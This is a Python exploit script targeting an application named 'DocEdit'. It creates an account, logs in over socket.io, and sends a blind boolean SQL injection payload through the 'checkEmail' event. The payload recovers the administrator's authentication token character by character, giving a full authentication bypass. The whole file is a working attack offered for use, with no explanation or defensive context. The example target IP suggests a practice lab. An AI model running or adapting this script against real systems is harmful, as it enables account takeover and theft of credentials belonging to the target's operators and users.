#!/usr/bin/env python3

import socketio
import sys
import time
import argparse

sio = socketio.Client()
ready = False
injection = "asf' OR (select ascii(substring(([QUERY]),[DIGIT],1)) = [CHAR])#" # SQLI payload (rest below)
johnDoeToken = ""
length = ""
query = ""
char = ""
AdminToken = ""
foundChar = False
done = False

# Response Handlers 
@sio.on('emailFound')
def on_message(data):
    global ready, char, AdminToken, foundChar
    if data:
        foundChar = True
        extracted_char = chr(char)
        AdminToken += extracted_char
        sys.stdout.write(extracted_char)
        sys.stdout.flush()
    ready = True

registering = False

@sio.on("message")
def on_message_event(data):
    global registering
    if not registering:
        return  # Ignore messages when not registering

    if isinstance(data, dict) and "message" in data:
        if data["message"] == "Your user was registered.":
            print("[+] User Registered Successfully")
        else:
            print(f"[-] Failed to register the user: {data['message']}")
    else:
        print("[-] Unexpected registration response:", data)
    registering = False


@sio.on("user")
def on_user_event(data):
    global johnDoeToken
    if isinstance(data, dict) and "token" in data:
        johnDoeToken = data["token"]
        print(f"[+] Login successful. John Doe's token: {johnDoeToken}")
    else:
        print("[-] Unexpected login response:", data)


@sio.event
def connect():
    try:
        CreateAccount()
        time.sleep(3)
    except Exception as e:
        print("[-] Error creating account:", e)
    try:
        Login()
        time.sleep(2)
    except Exception as e:
        print("[-] Error logging in:", e)
    try:
        print("[+] Starting SQLi")
        startLoop()
    except KeyboardInterrupt:
        print("[-] ctrl + c pressed, exiting...")

@sio.event
def connect_error(err):
    print(f"[-] The connection failed! Error: {err}")

@sio.event
def disconnect():
    print("[-] Disconnected from server")

def CreateAccount():
    global registering
    registering = True
    sio.emit("postRegister", {"firstName": "John","lastName":"Doe","email":"john@doe.ltd","password1":"Password!123","password2":"Password!123"})
    print("[+] Account john@doe.ltd:Password!123 has been successfully created.")

def Login():
    print("[*] Logging you in...")
    sio.emit("postLogin", {"email":"john@doe.ltd", "password":"Password!123"})
    

def startLoop():
    global foundChar, ready, char, done
    for x in range(1, int(length) + 1):
        for y in range(32, 126):
            if foundChar:
                foundChar = False
                break
            ready = False
            char = y
            payload = injection.replace("[QUERY]", query).replace("[DIGIT]", str(x)).replace("[CHAR]", str(y))
            sio.emit('checkEmail', {"token": johnDoeToken, "email": payload})
            sys.stdout.write(chr(y))
            sys.stdout.write("\b")
            sys.stdout.flush()
            while not ready:
                time.sleep(0.01)
    if len(AdminToken) == int(length):
        print()
        print(f"[+] Admin's token: {AdminToken}")
        done = True
    else:
        print("[-] SQLi Failed!")
    sio.disconnect()


def exfilAdminToken(target_ip, normalUserToken): 
    global query, length, johnDoeToken 
    length = "32" # 33 in real 
    query = "select token from AuthTokens where UserId=1" # SQL query to be executed on the target machine 
    johnDoeToken = normalUserToken 
    targetUrl = f"http://{target_ip}" 
    # Adjust socketio_path and transports if the server requires it 
    sio.connect(targetUrl, socketio_path="/socket.io", transports=["websocket"]) 
    while not done: 
        time.sleep(0.01) 
    return AdminToken


def main():
    parser = argparse.ArgumentParser(description="DocEdit Authentication Bypass Script. Exfiltrate the Admin Token via SQLi")
    parser.add_argument("target", help="target's IP address (e.g, 192.168.174.237)")
    args = parser.parse_args()

    exfilAdminToken(args.target, johnDoeToken)

if __name__ == "__main__":
    main()
